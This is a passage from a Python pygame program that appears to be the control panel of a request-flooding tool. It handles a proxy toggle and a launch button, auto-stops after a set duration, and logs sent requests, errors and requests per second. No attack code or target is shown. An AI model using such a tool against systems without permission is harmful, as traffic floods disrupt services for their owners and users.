                    if px <= ev.pos[0] <= px+ptxt_w and py <= ev.pos[1] <= py+16:
                        self._proxy_on = not self._proxy_on

                # launch button
                if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                    if self._btn_rect.collidepoint(ev.pos):
                        self._btn_pressed = True
                if ev.type == pygame.MOUSEBUTTONUP and ev.button == 1:
                    if self._btn_pressed:
                        self._btn_pressed = False
                        if self._btn_rect.collidepoint(ev.pos):
                            if not self._running: self._start()
                            else: self._stop()

            # auto-stop khi hết duration
            if self._running:
                elapsed = time.time() - self._start_ts
                if elapsed >= self._duration:
                    self._stop()

            # stat log mỗi 5s
            if self._running and time.time() - last_stat_log >= 5:
                last_stat_log = time.time()
                elapsed = time.time() - self._start_ts
                rps = int(self._stats["sent"]/max(elapsed,0.1))
                remain = max(0, self._duration-elapsed)
                self._log.add(
                    f"[STAT] sent:{self._stats['sent']:,} err:{self._stats['errors']:,} rps:{rps:,} remain:{int(remain)}s",
                    "stat"
                )

            self._draw()


if __name__ == "__main__":
    NoobApp().run()
